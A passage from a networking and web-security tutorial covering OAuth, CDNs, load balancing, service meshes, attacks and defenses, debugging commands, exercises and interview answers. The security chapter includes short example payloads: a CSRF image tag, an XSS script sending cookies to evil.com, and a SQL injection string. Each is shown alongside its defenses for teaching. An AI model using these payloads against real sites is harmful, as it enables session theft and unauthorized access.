2. Use access_token for API requests
3. access_token expires (401 Unauthorized)
4. POST /token/refresh (with refresh_token)
5. Receive new access_token (+ optionally new refresh_token)
6. If refresh_token is also expired → redirect to login
```

### 16.5 OAuth 2.0 — Delegated Authorization

**Problem**: You want to let a third-party app access your Google data without giving it your Google password.

**OAuth 2.0 Authorization Code Flow** (most secure):

```
┌──────┐          ┌──────────┐          ┌──────────┐
│ User │          │ Your App │          │ Google   │
└──┬───┘          └────┬─────┘          └────┬─────┘
   │                    │                     │
   │── Click "Login     │                     │
   │   with Google" ──→│                     │
   │                    │                     │
   │←── Redirect to ───│                     │
   │   accounts.google  │                     │
   │   .com/auth?       │                     │
   │   client_id=...&   │                     │
   │   redirect_uri=... │                     │
   │   &scope=email     │                     │
   │                    │                     │
   │── Authorize ──────────────────────────→│
   │   (enter password, │                     │
   │    grant consent)  │                     │
   │                    │                     │
   │←── Redirect to ──────────────────────│
   │   your-app.com/    │                     │
   │   callback?code=   │                     │
   │   AUTH_CODE        │                     │
   │                    │                     │
   │── Follow redirect →│                     │
   │                    │                     │
   │                    │── POST /token ────→│
   │                    │   code=AUTH_CODE     │
   │                    │   client_secret=...  │
   │                    │                     │
   │                    │←── access_token ───│
   │                    │    refresh_token     │
   │                    │                     │
   │                    │── GET /userinfo ──→│
   │                    │   Bearer token       │
   │                    │                     │
   │                    │←── User profile ───│
   │                    │                     │
   │←── Logged in! ────│                     │
```

### 16.6 CSRF — Cross-Site Request Forgery

**Attack**: Malicious site makes your browser send a request to a trusted site where you're authenticated:

```html
<!-- On evil-site.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">
<!-- Your browser sends the request WITH your bank cookies! -->
```

**Defenses**:
1. **SameSite cookies**: `SameSite=Lax` or `Strict` prevents cross-site cookie sending
2. **CSRF tokens**: Server generates a random token, embeds in form, validates on submission
3. **Check Origin/Referer headers**: Verify request came from your domain

---

## Chapter 17: CDNs — Content Delivery Networks

### 17.1 The Problem

Your server is in Virginia. A user in Tokyo makes a request. Light travels through fiber at ~200,000 km/s. Tokyo to Virginia is ~11,000 km. Physical minimum round-trip: ~110ms. Add routing, processing, congestion: real latency is 200-300ms.

For every resource.

### 17.2 The Solution

Put copies of your content on servers distributed globally (**edge nodes**). User in Tokyo gets served from a Tokyo edge node. RTT: 5-20ms.

### 17.3 CDN Architecture

```
                        ┌───────────────┐
                        │ Origin Server │
                        │  (Your server) │
                        └───────┬───────┘
                                │
                    ┌───────────┼───────────┐
                    │     Origin Shield      │
                    │   (central cache)      │
                    └───┬───────┬──────┬────┘
                        │       │      │
                  ┌─────┘       │      └─────┐
                  │             │             │
         ┌────────┴──┐  ┌──────┴───┐  ┌──────┴────┐
         │ PoP: Tokyo│  │PoP: London│  │PoP: NYC   │
         │ Edge Node │  │Edge Node  │  │Edge Node  │
         └─────┬─────┘  └─────┬────┘  └─────┬─────┘
               │               │              │
          Users in         Users in      Users in
          Asia             Europe         Americas
```

**PoP (Point of Presence)**: A physical location with CDN servers.

### 17.4 CDN Functionality

| Function | Description |
|----------|-------------|
| **Static asset caching** | Images, CSS, JS, fonts, videos |
| **Dynamic content acceleration** | Optimized routes between edge and origin |
| **DDoS protection** | Absorb traffic at the edge before it reaches origin |
| **TLS termination** | Handle TLS at the edge (faster handshake for users) |
| **HTTP/2 & HTTP/3** | Modern protocols at the edge, even if origin only supports HTTP/1.1 |
| **Image optimization** | Resize, compress, convert (WebP/AVIF) at the edge |
| **Edge computing** | Run code at the edge (Cloudflare Workers, Lambda@Edge) |
| **WAF** | Web Application Firewall at the edge |

### 17.5 Cache Hit vs Cache Miss

```
Cache HIT (fast):
  User → Edge Node (has cached copy) → Response to User
  RTT: 5-20ms

Cache MISS (slow, then cached):
  User → Edge Node (no cached copy) → Origin Server → Edge Node (caches it) → User
  First request: 200-300ms
  Subsequent requests: 5-20ms
```

**Cache Hit Ratio**: Percentage of requests served from cache. Target: >90% for static assets.

### 17.6 Cache Invalidation at CDN Level

1. **TTL expiration**: Set `Cache-Control: max-age=3600` in origin response
2. **Purge API**: `POST /purge {"urls": ["https://example.com/style.css"]}`
3. **Cache tags**: Tag responses, purge by tag (`purge tag:homepage`)
4. **Content-hashed filenames**: `app.a1b2c3.js` → new filename = new cache entry

### 17.7 Major CDN Providers

| Provider | Key Strength |
|----------|-------------|
| **Cloudflare** | Massive network, free tier, Workers (edge compute) |
| **AWS CloudFront** | Deep AWS integration, Lambda@Edge |
| **Fastly** | Real-time purging (<150ms global), VCL configuration |
| **Akamai** | Largest, oldest, most PoPs |
| **Google Cloud CDN** | Google's backbone network |
| **Vercel Edge Network** | Optimized for Next.js/frontend frameworks |

---

## Chapter 18: Load Balancers and Proxies

### 18.1 Forward Proxy

Sits between **clients** and the internet. The client knows about the proxy.

```
Client ──→ Forward Proxy ──→ Internet ──→ Server
```

Use cases:
- Corporate proxy (filter/log employee traffic)
- VPN (hide client IP, bypass geo-restrictions)
- Caching proxy (cache responses for multiple clients)

### 18.2 Reverse Proxy

Sits between the internet and **servers**. The client doesn't know about the proxy.

```
Client ──→ Internet ──→ Reverse Proxy ──→ Server(s)
```

Use cases:
- Load balancing
- TLS termination
- Compression
- Caching
- Rate limiting
- WAF (Web Application Firewall)
- A/B testing / canary deployments

Common reverse proxies: **Nginx**, **HAProxy**, **Envoy**, **Traefik**, **Caddy**

### 18.3 Load Balancing Algorithms

#### Layer 4 (Transport) Load Balancing

Routes based on **IP + port**. No inspection of HTTP content. Very fast.

```
Client ──→ L4 LB ──→ Server A (based on IP/port hash)
                ──→ Server B
                ──→ Server C
```

#### Layer 7 (Application) Load Balancing

Inspects HTTP content. Routes based on URL path, headers, cookies, etc.

```
Client ──→ L7 LB ──→ /api/* → API Server Pool
                ──→ /static/* → Static Server Pool
                ──→ /ws/* → WebSocket Server Pool
```

#### Algorithms:

| Algorithm | How It Works | Best For |
|-----------|-------------|----------|
| **Round Robin** | Rotate through servers sequentially | Equal-capacity servers |
| **Weighted Round Robin** | More traffic to higher-weight servers | Mixed-capacity servers |
| **Least Connections** | Send to server with fewest active connections | Varying request duration |
| **Least Response Time** | Send to fastest-responding server | Latency-sensitive |
| **IP Hash** | Same client IP → same server | Session affinity |
| **Consistent Hashing** | Minimize redistribution when servers added/removed | Caching layers |
| **Random** | Random selection | Simple, surprisingly effective |

### 18.4 Health Checks

Load balancers must detect unhealthy servers:

```
Active Health Checks:
  LB ──→ GET /health ──→ Server A: 200 OK ✓
  LB ──→ GET /health ──→ Server B: 503 ✗ (remove from pool)
  Every 10 seconds

Passive Health Checks:
  Monitor actual request responses
  5 consecutive 5xx → mark unhealthy
  After 30 seconds → retry
```

### 18.5 Session Affinity (Sticky Sessions)

Some applications store state on the server (sessions). Requests from the same client must go to the same server.

Methods:
- **Cookie-based**: LB sets a cookie identifying the backend server
- **IP hash**: Same client IP → same server (breaks behind NAT)
- **Header-based**: Route based on custom header (e.g., user ID)

**Better approach**: Make your application stateless (external session store like Redis). Then any server can handle any request.

### 18.6 SSL/TLS Termination

```
Option 1: TLS at Load Balancer (termination)
  Client ──TLS──→ LB ──plain HTTP──→ Servers
  Pro: Servers don't handle TLS overhead
  Con: Traffic between LB and servers is unencrypted

Option 2: TLS Passthrough
  Client ──TLS──→ LB ──TLS──→ Servers
  Pro: End-to-end encryption
  Con: LB can't inspect HTTP content (no L7 routing)

Option 3: TLS Re-encryption
  Client ──TLS──→ LB ──new TLS──→ Servers
  Pro: Encryption everywhere, L7 routing possible
  Con: Two TLS handshakes, more CPU
```

---

## Chapter 19: Service Mesh and Modern Infrastructure

### 19.1 The Microservices Problem

With hundreds of microservices, each team must implement:
- Service discovery
- Load balancing
- TLS encryption (mTLS)
- Retries, timeouts, circuit breaking
- Observability (metrics, tracing, logging)
- Rate limiting
- Authentication/authorization

Implementing this in every service is wasteful and error-prone.

### 19.2 What Is a Service Mesh?

A **service mesh** is a dedicated infrastructure layer that handles service-to-service communication. It extracts networking logic out of the application code.

### 19.3 Sidecar Pattern

Every service instance gets a **sidecar proxy** that handles all network traffic:

```
┌─────────────────────────────────────────────────────────┐
│ Pod                                                     │
│  ┌──────────────┐    ┌──────────────────────────────┐  │
│  │ Your Service │←──→│ Sidecar Proxy (Envoy)        │  │
│  │ (app code)   │    │ - mTLS                        │  │
│  │              │    │ - Load balancing               │  │
│  │              │    │ - Retries/circuit breaking     │  │
│  │              │    │ - Metrics/tracing              │  │
│  └──────────────┘    └──────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
           All traffic goes through the sidecar
```

### 19.4 Service Mesh Components

```
Data Plane: Sidecar proxies (Envoy)
  - Handles actual traffic
  - One per service instance
  - Intercepts all inbound/outbound traffic

Control Plane: Configuration management (Istio, Linkerd)
  - Configures all sidecars
  - Certificate management (mTLS)
  - Policy enforcement
  - Service discovery
```

### 19.5 Key Service Mesh Features

| Feature | Description |
|---------|-------------|
| **mTLS** | Automatic mutual TLS between all services. Zero-trust. |
| **Traffic Management** | A/B testing, canary deployments, traffic splitting |
| **Circuit Breaking** | Stop calling a failing service. Let it recover. |
| **Retries** | Automatic retry with backoff for transient failures |
| **Timeouts** | Prevent indefinite waiting |
| **Rate Limiting** | Control request rates between services |
| **Observability** | Automatic metrics, distributed tracing, access logs |
| **Fault Injection** | Test resilience by injecting delays/errors |

### 19.6 Popular Service Meshes

| Service Mesh | Key Characteristics |
|-------------|-------------------|
| **Istio** | Most feature-rich. Envoy proxy. Complex. Kubernetes-native. |
| **Linkerd** | Lightweight. Simple. Rust-based proxy. Easy to adopt. |
| **Consul Connect** | HashiCorp. Works outside Kubernetes too. |
| **AWS App Mesh** | Managed. AWS-native. Envoy-based. |

---

## Chapter 20: Network Security — Attacks and Defenses

### 20.1 DDoS — Distributed Denial of Service

**Goal**: Overwhelm a target with traffic so it can't serve legitimate users.

#### Types:

**Volumetric attacks** (Layer 3/4):
- UDP flood, ICMP flood, DNS amplification
- Saturate bandwidth
- Defense: CDN absorption, rate limiting, blackholing

**Protocol attacks** (Layer 3/4):
- SYN flood, Ping of Death
- Exhaust server connection state
- Defense: SYN cookies, connection limits

**Application attacks** (Layer 7):
- HTTP flood, Slowloris, cache-busting queries
- Exhaust application resources
- Defense: WAF, rate limiting, CAPTCHA, bot detection

### 20.2 Man-in-the-Middle (MITM)

**Attack**: Attacker intercepts communication between client and server.

```
Client ←──→ Attacker ←──→ Server
(thinks it's talking to Server)
```

**Defenses**:
- HTTPS/TLS (encryption + authentication)
- HSTS (prevent HTTP downgrade)
- Certificate pinning (prevent CA compromise)
- Certificate Transparency (detect rogue certificates)

### 20.3 XSS — Cross-Site Scripting

**Attack**: Inject malicious JavaScript into a trusted website.

```
Stored XSS:
  Attacker posts: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
  Every user who views the page executes this script

Reflected XSS:
  URL: https://example.com/search?q=<script>alert('xss')</script>
  Server reflects the input in the response without sanitization
```

**Defenses**:
- **Output encoding**: Escape HTML entities (`<` → `&lt;`)
- **Content Security Policy (CSP)**: `Content-Security-Policy: script-src 'self'`
- **HttpOnly cookies**: JavaScript can't access session cookies
- **Input validation**: Sanitize all user input

### 20.4 CSRF — Cross-Site Request Forgery

(Covered in Chapter 16.6 above)

### 20.5 SQL Injection

**Attack**: Inject SQL through user input.

```
Input: ' OR 1=1 --
Query becomes: SELECT * FROM users WHERE username='' OR 1=1 --' AND password='...'
Result: Returns all users
```

**Defenses**:
- Parameterized queries / prepared statements (ALWAYS)
- ORM (provides parameterization by default)
- Input validation
- Least-privilege database accounts

### 20.6 Content Security Policy (CSP)

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src *;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

CSP tells the browser which resources are allowed to load and from where. Blocks inline scripts (prevents XSS), restricts frame embedding (prevents clickjacking).

### 20.7 Security Headers Checklist

| Header | Value | Purpose |
|--------|-------|---------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | Force HTTPS |
| `Content-Security-Policy` | (see above) | Prevent XSS, clickjacking |
| `X-Content-Type-Options` | `nosniff` | Prevent MIME sniffing |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Prevent clickjacking |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Control referer header |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Restrict browser features |
| `X-XSS-Protection` | `0` | Disable browser XSS filter (CSP is better) |
| `Cross-Origin-Opener-Policy` | `same-origin` | Isolate browsing context |
| `Cross-Origin-Resource-Policy` | `same-origin` | Prevent cross-origin reads |

---

## Chapter 21: Observability and Debugging

### 21.1 The Three Pillars of Observability

```
┌──────────┐    ┌──────────┐    ┌──────────┐
│  Metrics  │    │   Logs   │    │  Traces  │
│           │    │          │    │          │
│ What is   │    │ What     │    │ How does │
│ happening │    │ happened │    │ a request│
│ right now?│    │ ?        │    │ flow?    │
└──────────┘    └──────────┘    └──────────┘
```

### 21.2 Network Metrics to Monitor

| Metric | What It Tells You | Alert When |
|--------|-------------------|------------|
| **Latency (p50, p95, p99)** | How fast requests are | p99 > threshold |
| **Request rate (RPS)** | Traffic volume | Sudden spike or drop |
| **Error rate (5xx/total)** | System health | > 1% |
| **Bandwidth** | Network utilization | > 80% capacity |
| **Connection pool** | Resource utilization | Pool exhaustion |
| **DNS resolution time** | DNS performance | > 100ms |
| **TLS handshake time** | Encryption overhead | > 500ms |
| **TCP retransmissions** | Network quality | > 2% |
| **Time to First Byte (TTFB)** | Server + network perf | > 500ms |

### 21.3 Distributed Tracing

In a microservice architecture, one user request may touch 20 services. How do you debug latency?

**Distributed tracing** propagates a **trace ID** across all services:

```
Request: GET /checkout

Trace ID: abc-123
├── Span 1: API Gateway (50ms)
│   ├── Span 2: Auth Service (10ms)
│   ├── Span 3: Cart Service (80ms)
│   │   └── Span 4: Database (60ms)
│   ├── Span 5: Payment Service (200ms)  ← Bottleneck!
│   │   └── Span 6: External Payment API (180ms)
│   └── Span 7: Notification Service (15ms)
Total: 355ms
```

Tools: **Jaeger**, **Zipkin**, **OpenTelemetry**, **Datadog APM**, **AWS X-Ray**

### 21.4 Debugging Tools

#### Browser DevTools — Network Tab

| Column | What It Shows |
|--------|--------------|
| Name | URL of the resource |
| Status | HTTP status code |
| Type | Resource type (document, script, xhr, img) |
| Initiator | What triggered the request |
| Size | Transfer size (compressed) vs actual size |
| Time | Total time breakdown |
| Waterfall | Visual timeline |

**Timing breakdown** (click on a request):
```
Queueing:          Time waiting in browser queue
Stalled:           Time blocked (e.g., max connections per domain)
DNS Lookup:        DNS resolution time
Initial Connection: TCP handshake time
SSL:               TLS handshake time
Request sent:      Time to send the request
Waiting (TTFB):    Time waiting for first byte of response
Content Download:  Time to download the response body
```

#### curl — Command Line HTTP Client

```bash
# Basic GET
curl https://api.example.com/users

# Verbose (see headers)
curl -v https://api.example.com/users

# POST with JSON
curl -X POST https://api.example.com/users \
  -H "Content-Type: application/json" \
  -d '{"name": "John"}'

# Follow redirects
curl -L https://example.com

# Show timing breakdown
curl -o /dev/null -s -w "
    DNS:        %{time_namelookup}s
    Connect:    %{time_connect}s
    TLS:        %{time_appconnect}s
    TTFB:       %{time_starttransfer}s
    Total:      %{time_total}s
    Size:       %{size_download} bytes
" https://example.com

# Show response headers only
curl -I https://example.com
```

#### dig / nslookup — DNS Debugging

```bash
# Query A record
dig google.com

# Query specific record type
dig google.com MX
dig google.com NS
dig google.com TXT

# Query specific DNS server
dig @8.8.8.8 google.com

# Trace full resolution path
dig +trace google.com

# Short answer only
dig +short google.com
```

#### tcpdump — Packet Capture

```bash
# Capture all traffic on interface en0
sudo tcpdump -i en0

# Capture HTTP traffic (port 80)
sudo tcpdump -i en0 port 80

# Capture traffic to/from specific host
sudo tcpdump -i en0 host api.example.com

# Save to file (open in Wireshark)
sudo tcpdump -i en0 -w capture.pcap

# Show packet contents in ASCII
sudo tcpdump -i en0 -A port 80
```

#### Wireshark

GUI tool for deep packet inspection. Can:
- Reassemble TCP streams
- Decode hundreds of protocols
- Filter by any field
- Follow conversation flows
- Analyze TLS handshakes (with server keys)

#### openssl — TLS Debugging

```bash
# Test TLS connection and show certificate
openssl s_client -connect example.com:443 -servername example.com

# Show certificate details
openssl s_client -connect example.com:443 | openssl x509 -text -noout

# Test specific TLS version
openssl s_client -connect example.com:443 -tls1_3

# Check certificate expiration
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates
```

#### traceroute / mtr — Path Analysis

```bash
# Show the route packets take
traceroute google.com

# mtr (better traceroute — continuous monitoring)
mtr google.com

# Show packet loss and latency per hop
mtr --report google.com
```

---

## Chapter 22: The Complete Request Lifecycle

When you type `https://www.google.com` and press Enter, here is **everything** that happens:

### Phase 1: URL Processing
```
1. Browser parses the URL:
   scheme: https
   host: www.google.com
   port: 443 (default for HTTPS)
   path: /
   query: (none)
   fragment: (none)

2. HSTS check:
   Is google.com in the HSTS preload list? → YES
   Force HTTPS (even if user typed HTTP)

3. Check browser HTTP cache:
   Do we have a fresh cached response for this URL?
   → Probably not for the main page (no-cache)
```

### Phase 2: DNS Resolution
```
4. Browser DNS cache: recently resolved? → Miss

5. OS DNS cache: cached? → Miss

6. OS reads /etc/hosts: hardcoded? → No

7. OS queries configured recursive resolver (e.g., 8.8.8.8):

   Resolver cache: has it? → Assume miss

   Resolver → Root Server:
   "Where is .com?" → "Ask a.gtld-servers.net"

   Resolver → .com TLD Server:
   "Where is google.com?" → "Ask ns1.google.com"

   Resolver → Google's Authoritative NS:
   "What's www.google.com?" → "142.250.80.46 (TTL: 300)"

   Resolver caches result, returns to OS
   OS caches, returns to browser
   Browser caches

   Total DNS time: 20-100ms (uncached)
```

### Phase 3: TCP Connection
```
8. Browser checks connection pool:
   Existing keep-alive connection to 142.250.80.46:443? → No

9. OS creates a socket

10. TCP 3-way handshake:
    Client → SYN (seq=random_ISN)
    Server → SYN-ACK (seq=random_ISN, ack=client_ISN+1)
    Client → ACK (ack=server_ISN+1)

    Time: 1 RTT (e.g., 50ms)
```

### Phase 4: TLS Handshake
```
11. TLS 1.3 handshake:
    Client → ClientHello:
      - TLS 1.3
      - Cipher suites (AES-256-GCM, ChaCha20)
      - ECDHE key share (X25519 public key)
      - SNI: www.google.com

    Server → ServerHello:
      - TLS 1.3
      - Chosen cipher: TLS_AES_256_GCM_SHA384
      - ECDHE key share (server's public key)

    Both compute shared secret via ECDHE

    Server → {Encrypted} Certificate + CertificateVerify + Finished

    Client validates certificate:
      - Not expired? ✓
      - Chain to trusted root CA? ✓
      - Domain matches SAN? ✓
      - OCSP status (stapled)? ✓
      - Certificate Transparency? ✓

    Client → {Encrypted} Finished

    Time: 1 RTT (e.g., 50ms)
    Total so far: DNS + TCP + TLS = ~150ms
```

### Phase 5: HTTP Request/Response
```
12. Browser sends HTTP/2 request (encrypted):
    :method: GET
    :path: /
    :authority: www.google.com
    :scheme: https
    accept: text/html
    accept-encoding: gzip, br
    accept-language: en-US
    user-agent: Mozilla/5.0 ...
    cookie: (various Google cookies)

13. Server processing:
    Load balancer → web server → application server
    Generate personalized homepage
    Compress with Brotli

14. Server sends HTTP/2 response:
    :status: 200
    content-type: text/html; charset=UTF-8
    content-encoding: br
    cache-control: private, max-age=0
    set-cookie: (various)
    strict-transport-security: max-age=31536000
    content-security-policy: ...

    [Compressed HTML body]

    Time: TTFB ~200ms + download ~50ms
```

### Phase 6: Browser Rendering
```
15. HTML Parsing → DOM Construction:
    Parser reads HTML tokens → builds DOM tree
    When it encounters <link>, <script>, <img> → fires off parallel requests

16. CSS Parsing → CSSOM Construction:
    Parse all CSS (inline, external) → build CSSOM tree
    CSS is render-blocking

17. JavaScript Execution:
    Download, parse, compile, execute
    May modify DOM (async/defer attributes control timing)
    JS is parser-blocking (unless async/defer)

18. Render Tree Construction:
    DOM + CSSOM → Render Tree
    Only visible elements (display:none excluded)
    Computed styles applied

19. Layout (Reflow):
    Calculate exact position and size of every element
    Box model: content + padding + border + margin

20. Paint:
    Fill in pixels: text, colors, images, borders, shadows
    Create paint records (drawing instructions)

21. Compositing:
    Separate elements into layers (transforms, opacity, will-change)
    GPU composites layers into final image
    Display on screen

22. Total time: ~500ms-2s for initial page load
    First Contentful Paint (FCP): ~500ms
    Largest Contentful Paint (LCP): ~1-2s
    Time to Interactive (TTI): ~2-3s
```

---

## Chapter 23: Hands-On Exercises

### Exercise 1: DNS Resolution Deep Dive

```bash
# Trace the full DNS resolution for a domain
dig +trace example.com

# Compare resolution times across DNS providers
time dig @8.8.8.8 example.com        # Google
time dig @1.1.1.1 example.com        # Cloudflare
time dig @208.67.222.222 example.com # OpenDNS

# Check all record types for a domain
dig example.com ANY

# Find mail servers
dig example.com MX

# Reverse DNS lookup
dig -x 142.250.80.46
```

**Questions to answer:**
1. How many nameservers are in the chain?
2. What's the TTL of each record?
3. Which DNS provider resolves fastest from your location?

### Exercise 2: TCP Handshake Observation

```bash
# Capture a TCP handshake
sudo tcpdump -i en0 -c 10 "tcp[tcpflags] & (tcp-syn|tcp-fin) != 0" and host example.com

# In another terminal, trigger a connection
curl https://example.com

# Observe: SYN, SYN-ACK, ACK packets
# Note the sequence numbers
```

### Exercise 3: HTTP/1.1 vs HTTP/2 Performance

```bash
# Check which HTTP version a site uses
curl -v --http1.1 https://example.com 2>&1 | grep "< HTTP"
curl -v --http2 https://example.com 2>&1 | grep "< HTTP"

# Compare timing
curl -o /dev/null -s -w "HTTP Version: %{http_version}\nTotal: %{time_total}s\nTTFB: %{time_starttransfer}s\n" --http1.1 https://example.com
curl -o /dev/null -s -w "HTTP Version: %{http_version}\nTotal: %{time_total}s\nTTFB: %{time_starttransfer}s\n" --http2 https://example.com
```

### Exercise 4: TLS Certificate Inspection

```bash
# View the full certificate chain
openssl s_client -connect google.com:443 -showcerts

# Check certificate details
echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -text -noout

# Check when the certificate expires
echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -noout -dates

# Test TLS 1.3 specifically
openssl s_client -connect google.com:443 -tls1_3

# Check supported cipher suites
nmap --script ssl-enum-ciphers -p 443 google.com
```

**Questions to answer:**
1. Who issued Google's certificate?
2. What cipher suite was negotiated?
3. When does the certificate expire?
4. How many certificates are in the chain?

### Exercise 5: Build a Request Timing Dashboard

```bash
#!/bin/bash
# Save as request-timing.sh

URL=${1:-"https://example.com"}

echo "=== Request Timing for $URL ==="
echo ""

curl -o /dev/null -s -w "\
  DNS Lookup:     %{time_namelookup}s\n\
  TCP Connect:    %{time_connect}s\n\
  TLS Handshake:  %{time_appconnect}s\n\
  Request Sent:   %{time_pretransfer}s\n\
  TTFB:           %{time_starttransfer}s\n\
  Total:          %{time_total}s\n\
  \n\
  HTTP Version:   %{http_version}\n\
  Response Code:  %{http_code}\n\
  Download Size:  %{size_download} bytes\n\
  Upload Size:    %{size_upload} bytes\n\
  Speed Download: %{speed_download} bytes/sec\n\
  \n\
  Redirect URL:   %{redirect_url}\n\
  Num Redirects:  %{num_redirects}\n\
  Remote IP:      %{remote_ip}\n\
  Remote Port:    %{remote_port}\n\
" "$URL"
```

### Exercise 6: WebSocket Hands-On

```javascript
// Open browser DevTools console and run:

const ws = new WebSocket('wss://echo.websocket.events');

ws.onopen = () => {
  console.log('Connected!');
  ws.send('Hello from browser!');
};

ws.onmessage = (event) => {
  console.log('Received:', event.data);
};

ws.onclose = (event) => {
  console.log('Closed:', event.code, event.reason);
};

ws.onerror = (error) => {
  console.log('Error:', error);
};

// Send more messages:
// ws.send('Another message');

// Close connection:
// ws.close(1000, 'Done');
```

### Exercise 7: CORS Debugging

```bash
# Simulate a CORS preflight request
curl -v -X OPTIONS https://api.example.com/endpoint \
  -H "Origin: https://different-domain.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type, Authorization"

# Check: Does the response include Access-Control-Allow-* headers?
```

### Exercise 8: Cache Header Analysis

```bash
# Check caching headers for various resources
curl -I https://cdn.example.com/style.css
curl -I https://api.example.com/users
curl -I https://example.com/

# Look for:
# Cache-Control
# ETag
# Last-Modified
# Expires
# Vary

# Test conditional request
ETAG=$(curl -sI https://example.com/ | grep -i etag | awk '{print $2}' | tr -d '\r')
curl -v -H "If-None-Match: $ETAG" https://example.com/
# Should get 304 Not Modified
```

### Exercise 9: Network Path Analysis

```bash
# Trace route to various destinations
traceroute google.com
traceroute amazon.com

# Use mtr for continuous monitoring
mtr --report-cycles 10 google.com

# Questions:
# How many hops?
# Where does latency increase most?
# Any packet loss at specific hops?
```

### Exercise 10: Security Header Audit

```bash
# Check security headers for any website
curl -sI https://example.com | grep -iE "(strict-transport|content-security|x-frame|x-content-type|referrer-policy|permissions-policy)"

# Use securityheaders.com for a comprehensive report
# Compare: google.com vs a random small website
```

---

## Chapter 24: Interview-Ready Cheat Sheet

### Rapid-Fire Definitions

| Term | One-Line Definition |
|------|-------------------|
| **TCP** | Reliable, ordered, connection-oriented transport over IP |
| **UDP** | Unreliable, connectionless, fast transport over IP |
| **HTTP** | Text-based request-response protocol for the web |
| **HTTPS** | HTTP encrypted with TLS |
| **TLS** | Encryption protocol providing confidentiality, integrity, authentication |
| **DNS** | Translates domain names to IP addresses |
| **IP** | Addresses and routes packets across networks |
| **NAT** | Maps private IPs to public IPs through a router |
| **CDN** | Geographically distributed cache for fast content delivery |
| **Load Balancer** | Distributes traffic across multiple servers |
| **Reverse Proxy** | Sits in front of servers, handles SSL/caching/routing |
| **WebSocket** | Full-duplex persistent communication over TCP |
| **SSE** | Server-to-client streaming over HTTP |
| **CORS** | Browser security mechanism controlling cross-origin requests |
| **CSRF** | Attack where a malicious site makes requests using your cookies |
| **XSS** | Attack injecting malicious scripts into trusted websites |
| **JWT** | Self-contained signed token for stateless authentication |
| **OAuth 2.0** | Delegated authorization protocol |
| **QUIC** | UDP-based transport with built-in encryption and multiplexing |
| **gRPC** | High-performance RPC framework using HTTP/2 and Protobuf |
| **Service Mesh** | Infrastructure layer handling service-to-service networking |
| **mTLS** | Both client and server authenticate with certificates |
| **BGP** | Protocol that routes traffic between autonomous systems (ISPs) |

### Common Interview Questions

**Q: What happens when you type a URL in the browser?**
A: URL parsing → HSTS check → DNS resolution (cache → recursive → root → TLD → authoritative) → TCP handshake (SYN/SYN-ACK/ACK) → TLS handshake (ClientHello/ServerHello/keys) → HTTP request → server processing → HTTP response → HTML parsing → DOM/CSSOM → render tree → layout → paint → composite → display.

**Q: TCP vs UDP?**
A: TCP: reliable, ordered, connection-oriented, flow/congestion control. Used for HTTP, email, file transfer. UDP: unreliable, unordered, connectionless, fast. Used for DNS, video, gaming, VoIP. QUIC builds reliability on UDP for HTTP/3.

**Q: How does HTTPS work?**
A: Client and server perform TLS handshake: exchange cipher suites, perform ECDHE key exchange for forward secrecy, server proves identity with certificate (verified against CA chain). Shared secret derived, all subsequent data encrypted with symmetric cipher (AES-GCM).

**Q: HTTP/1.1 vs HTTP/2 vs HTTP/3?**
A: HTTP/1.1: text, one request per connection, HOL blocking. HTTP/2: binary, multiplexed streams over single TCP, HPACK compression, but TCP-level HOL blocking. HTTP/3: QUIC over UDP, independent streams (no HOL blocking), 1-RTT/0-RTT connection, built-in encryption, connection migration.

**Q: How does DNS work?**
A: Hierarchical distributed system. Browser cache → OS cache → recursive resolver → root nameserver (.com location) → TLD nameserver (google.com NS) → authoritative nameserver (actual IP). Results cached with TTL. DNSSEC adds cryptographic verification.

**Q: Explain CORS.**
A: Same-origin policy blocks cross-origin requests. CORS allows servers to opt in. Simple requests: browser adds Origin header, server responds with Access-Control-Allow-Origin. Non-simple requests: browser sends OPTIONS preflight first, server responds with allowed methods/headers/credentials, then browser sends actual request.

**Q: Session vs JWT authentication?**
A: Sessions: server stores state (Redis/DB), client holds session ID in cookie. Server can revoke instantly. Needs shared storage for horizontal scaling. JWT: server signs a token with claims, client sends in Authorization header. Stateless, scales easily. Cannot revoke before expiry. Larger payload.

**Q: How would you debug a slow API request?**
A: Check timing breakdown (DNS/TCP/TLS/TTFB/download). If DNS slow → check resolver, TTL. If TCP slow → check distance, packet loss. If TLS slow → check cipher, cert chain. If TTFB slow → check server processing (DB queries, external calls, CPU). If download slow → check response size, compression, bandwidth. Use distributed tracing for microservice chains.

**Q: What is a CDN and when would you use one?**
A: CDN = geographically distributed cache. Serves content from edge nodes near users. Reduces latency, offloads origin, provides DDoS protection. Use for: static assets (images, CSS, JS), video, any content with geographic user distribution. CDN cache hit ratio > 90% is the target.

**Q: Explain TCP congestion control.**
A: Sender maintains congestion window (cwnd). Slow start: exponential growth (double cwnd each RTT). After ssthresh: congestion avoidance (linear growth). On timeout: cwnd=1, restart slow start. On 3 duplicate ACKs: fast retransmit + fast recovery (cwnd halved, skip slow start). Modern: BBR estimates bandwidth/RTT directly instead of reacting to loss.

---

## Quick Reference: Port Numbers

| Port | Protocol | Service |
|------|----------|---------|
| 20/21 | TCP | FTP (data/control) |
| 22 | TCP | SSH |
| 25 | TCP | SMTP (email sending) |
| 53 | TCP/UDP | DNS |
| 80 | TCP | HTTP |
| 110 | TCP | POP3 (email retrieval) |
| 143 | TCP | IMAP (email retrieval) |
| 443 | TCP | HTTPS |
| 465 | TCP | SMTPS (SMTP over TLS) |
| 587 | TCP | SMTP (submission) |
| 853 | TCP | DNS over TLS |
| 993 | TCP | IMAPS |
| 3306 | TCP | MySQL |
| 5432 | TCP | PostgreSQL |
| 6379 | TCP | Redis |
| 8080 | TCP | HTTP (alternate) |
| 8443 | TCP | HTTPS (alternate) |
| 27017 | TCP | MongoDB |

---

## Quick Reference: HTTP Headers

### Request Headers
```
